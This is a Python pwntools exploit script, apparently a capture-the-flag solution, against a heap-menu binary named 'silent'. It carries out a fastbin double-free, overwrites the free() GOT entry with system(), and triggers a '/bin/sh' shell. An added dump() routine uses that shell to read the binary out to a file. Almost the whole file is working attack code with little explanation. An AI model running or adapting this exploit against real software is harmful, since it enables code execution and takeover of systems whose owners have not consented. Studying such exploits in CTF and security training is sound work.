#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 1
context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF('./silent',checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
	s = process('./silent')
elif DEBUG == 2:
	libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
	s = process('./silent', env={'LD_PRELOAD':'/root/workspace/expmake/libc_x64'})
elif DEBUG == 3:
	libc = ELF('/root/workspace/expmake/libc_x64',checksec=False)
	ip = 'localhost' 
	port = 10001
	s = remote(ip,port)

def z(addr):
    raw_input('debug?')
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input('debug?')
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def menu(idx):
	sleep(0.2)
	s.sl(str(idx))

def _alloc(size,msg):
	menu(1)
	sleep(0.2)
	s.sl(str(size))
	sleep(0.2)
	s.s(msg)

def _delete(idx):
	menu(2)
	sleep(0.2)	
	s.sl(str(idx))

def _edit(idx,msg):
	menu(3)
	sleep(0.2)
	s.sl(str(idx))
	sleep(0.2)
	s.s(msg)
	sleep(0.2)
	s.s(msg)
	
def pwn():
	_alloc(0x60,'a'*8)
	_alloc(0x60,'b'*8)

	_delete(0)
	_delete(1)
	_delete(0)

	_edit(0,p32(0x6020a0-3))
	_alloc(0x60,'/bin/sh\x00')
	_alloc(0x60,'d'*(0x10+3)+p32(elf.got['free']))
	_edit(0,p64(elf.sym['system']))
	
	#z(0x400B11)

	_delete(2)	

	s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl('cat silent')
	s.sl('exit')
	data = s.ra()
	f = open('dump', 'wb')
	f.write(data)
	f.close()

if __name__ == '__main__':
    pwn()
